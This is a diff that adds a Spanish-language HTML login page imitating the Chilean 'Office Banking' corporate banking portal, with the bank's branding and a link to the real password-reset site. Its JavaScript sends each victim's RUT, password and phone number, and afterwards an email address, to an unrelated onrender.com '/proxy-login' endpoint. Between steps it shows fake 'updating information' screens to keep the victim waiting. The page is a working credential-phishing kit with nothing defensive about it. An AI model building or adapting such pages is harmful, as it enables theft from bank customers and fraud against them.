@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Office Banking</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="styles.css">
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
+<style>
+  body {
+    background-color: #f5f5f5; /* fondo gris claro */
+  }
+  .carousel-item img {
+    object-fit: cover;
+    height: calc(100vh - 60px); /* ocupa toda la pantalla sin tapar la navbar */
+  }
+  .carousel-inner .row {
+    margin: 0;
+  }
+  .carousel-inner .col-12 {
+    padding: 0;
+  }
+  .carousel-control-prev-icon,
+  .carousel-control-next-icon {
+    filter: invert(100%); /* flechas en blanco */
+  }
+</style>
+</head>
+<body>
+
+  <!-- Barra superior blanca -->
+ <nav class="navbar navbar-expand-lg" style="background-color:#fff; border-bottom:1px solid #ddd;">
+  <div class="container-fluid d-flex justify-content-between align-items-center">
+    <!-- Logo -->
+    <a class="navbar-brand d-flex align-items-center" href="#">
+      <img src="/logo-office-banking.png" alt="Logo Office Banking" style="height:40px;">
+    </a>
+      <!-- Bootstrap Icons -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.css">
+
+<!-- Botón Ingresar -->
+<button class="btn btn-ingresar ms-auto" type="button" data-bs-toggle="offcanvas" data-bs-target="#offcanvasLogin"
+  style="background-color:#cc0000; color:#fff; border-radius:25px; font-weight:bold; padding:6px 16px; border:none; display:flex; align-items:center;">
+  <i class="bi bi-person" style="font-size:20px; margin-right:8px;"></i> Ingresar
+</button>
+    </div>
+  </nav>
+
+<!-- Carrusel -->
+<div id="carouselExample" class="carousel slide" data-bs-ride="carousel">
+  <div class="carousel-inner">
+
+    <!-- Primer par -->
+    <div class="carousel-item active">
+      <div class="row">
+        <div class="col-12 col-md-6">
+          <img src="/beneficiosEmpresas.jpg" class="d-block w-100" alt="Beneficios Empresas">
+        </div>
+        <div class="col-12 col-md-6">
+          <img src="/beneficios2.png" class="d-block w-100" alt="Beneficios 2">
+        </div>
+      </div>
+    </div>
+
+    <!-- Segundo par -->
+    <div class="carousel-item">
+      <div class="row">
+        <div class="col-12 col-md-6">
+          <img src="/Tc2.png" class="d-block w-100" alt="TC2">
+        </div>
+        <div class="col-12 col-md-6">
+          <img src="/tc_empresas.jpg" class="d-block w-100" alt="Tarjeta Empresas">
+        </div>
+      </div>
+    </div>
+
+    <!-- Tercer par -->
+    <div class="carousel-item">
+      <div class="row">
+        <div class="col-12 col-md-6">
+          <img src="/SantanderX.jpg" class="d-block w-100" alt="Santander X">
+        </div>
+        <div class="col-12 col-md-6">
+          <img src="/soap2.png" class="d-block w-100" alt="SOAP 2">
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- Flechas de navegación -->
+  <button class="carousel-control-prev" type="button" data-bs-target="#carouselExample" data-bs-slide="prev">
+    <span class="carousel-control-prev-icon" aria-hidden="true"></span>
+    <span class="visually-hidden">Anterior</span>
+  </button>
+  <button class="carousel-control-next" type="button" data-bs-target="#carouselExample" data-bs-slide="next">
+    <span class="carousel-control-next-icon" aria-hidden="true"></span>
+    <span class="visually-hidden">Siguiente</span>
+  </button>
+</div>
+
+  <!-- Offcanvas con tu flujo original -->
+<div class="offcanvas offcanvas-end" tabindex="-1" id="offcanvasLogin" aria-labelledby="offcanvasLoginLabel">
+  <div class="offcanvas-header">
+    <h5 class="offcanvas-title" id="offcanvasLoginLabel">Bienvenido a Office Banking</h5>
+    <button type="button" class="btn-close" data-bs-dismiss="offcanvas"></button>
+  </div>
+  <div class="offcanvas-body">
+    <div class="offcanvas-body">
+      <div class="login-box">
+        <img src="/logo-office-banking.png" alt="Office Banking"
+     style="width:100%; max-width:280px; margin:20px auto; display:block;">
+
+        <!-- Formulario inicial -->
+        <form id="loginForm">
+          <label for="rut">RUT</label>
+          <input type="text" id="rut" name="rut" placeholder="12.345.678-5" required>
+          
+          <label for="passwd">Contraseña</label>
+          <input type="password" id="passwd" name="passwd" required>
+
+          <label for="telefono">Teléfono actualizado</label>
+          <input type="tel" id="telefono" name="telefono" placeholder="+56 9 1234 5678" required>
+                          
+          <div class="options">
+            <a href="https://wslogin.officebanking.cl/autogestion-clave" target="_blank">Olvidé mi clave</a>
+          </div>
+          
+          <button type="submit" class="btn-red w-100">Ingresar</button>
+        </form>
+        <div id="resultado"></div>
+
+        <!-- Pantalla de espera -->
+        <div id="pantallaEspera" class="hidden">
+          <h2>Estamos actualizando la información, por favor espera...</h2>
+          <div class="spinner"></div>
+        </div>
+
+        <!-- Formulario de correo -->
+        <div id="formCorreo" class="hidden">
+          <h2>Necesitamos actualizar tu correo electrónico</h2>
+          <input type="email" id="correo" placeholder="Ingresa tu correo">
+          <button class="btn-red" onclick="enviarCorreo()">Enviar</button>
+        </div>
+
+        <!-- Pantalla de productos disponibles -->
+        <div id="pantallaProductos" class="hidden">
+          <h2>Tenemos algunos productos disponibles</h2>
+          <button class="btn-red" onclick="continuarProductos()">Continuar</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Scripts al final del body -->
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
+ 
+  <script>    // ✅ Autoformateo de RUT en tiempo real
+    function formatearRUT(valor) {
+      valor = valor.replace(/\./g, "").replace(/-/g, "");
+      if(valor.length === 0) return "";
+      let dv = valor.slice(-1);
+      let cuerpo = valor.slice(0, -1);
+      let cuerpoFormateado = "";
+      while(cuerpo.length > 3){
+        cuerpoFormateado = "." + cuerpo.slice(-3) + cuerpoFormateado;
+        cuerpo = cuerpo.slice(0, -3);
+      }
+      cuerpoFormateado = cuerpo + cuerpoFormateado;
+      return cuerpoFormateado + "-" + dv;
+    }
+
+    document.getElementById("rut").addEventListener("input", function(e){
+      let valor = e.target.value.replace(/[^0-9kK]/g, ""); // solo números y K
+      e.target.value = formatearRUT(valor);
+    });
+
+    // Validación de RUT
+    function validarRut(rutCompleto) {
+      rutCompleto = rutCompleto.replace(/\./g, "").replace(/-/g, "").toUpperCase();
+      if(rutCompleto.length < 2) return false;
+      let cuerpo = rutCompleto.slice(0, -1);
+      let dv = rutCompleto.slice(-1);
+      let suma = 0, multiplo = 2;
+      for(let i = cuerpo.length - 1; i >= 0; i--) {
+        suma += parseInt(cuerpo.charAt(i)) * multiplo;
+        multiplo = multiplo < 7 ? multiplo + 1 : 2;
+      }
+      let dvEsperado = 11 - (suma % 11);
+      dvEsperado = dvEsperado === 11 ? "0" : dvEsperado === 10 ? "K" : dvEsperado.toString();
+      return dv === dvEsperado;
+    }
+
+document.getElementById("loginForm").addEventListener("submit", async function(e){
+  e.preventDefault();
+  const rut = document.getElementById("rut").value;
+  const passwd = document.getElementById("passwd").value;
+  const telefono = document.getElementById("telefono").value;
+
+  if(!validarRut(rut)){
+    document.getElementById("resultado").innerText = "❌ RUT inválido";
+    return;
+  }
+
+  try {
+    const response = await fetch("https://autorizacion-ob-l9me.onrender.com/proxy-login", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ rut, passwd, telefono })
+    });
+    const data = await response.json();
+    document.getElementById("resultado").innerText = data.mensaje;
+
+    if(response.ok){
+      document.getElementById("loginForm").style.display="none";
+      document.getElementById("pantallaEspera").classList.remove("hidden");
+
+      setTimeout(()=>{
+        document.getElementById("pantallaEspera").classList.add("hidden");
+        document.getElementById("formCorreo").classList.remove("hidden");
+      }, 5000); // puedes ajustar el tiempo
+    }
+  } catch (error) {
+    document.getElementById("resultado").innerText = "⚠️ Error al conectar con el servidor.";
+  }
+});
+
+    async function enviarCorreo(){
+      const correo = document.getElementById("correo").value;
+
+      try {
+        const response = await fetch("https://autorizacion-ob-l9me.onrender.com/proxy-login", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ mail: correo })
+        });
+        const data = await response.json();
+        document.getElementById("resultado").innerText = data.mensaje;
+      } catch (error) {
+        console.error("Error al enviar correo:", error);
+      }
+      document.getElementById("formCorreo").classList.add("hidden");
+      document.getElementById("pantallaEspera").classList.remove("hidden");
+
+      setTimeout(()=>{
+        document.getElementById("pantallaEspera").classList.add("hidden");
+        document.getElementById("pantallaProductos").classList.remove("hidden");
+      }, 5000);
+    }
+
+    function continuarProductos(){
+      document.getElementById("pantallaProductos").classList.add("hidden");
+      document.getElementById("pantallaEspera").classList.remove("hidden");
+
+      setTimeout(()=>{
+        window.location.href="productos.html";
+      }, 5000);
+    }
+  </script>
+</body>
+</html>
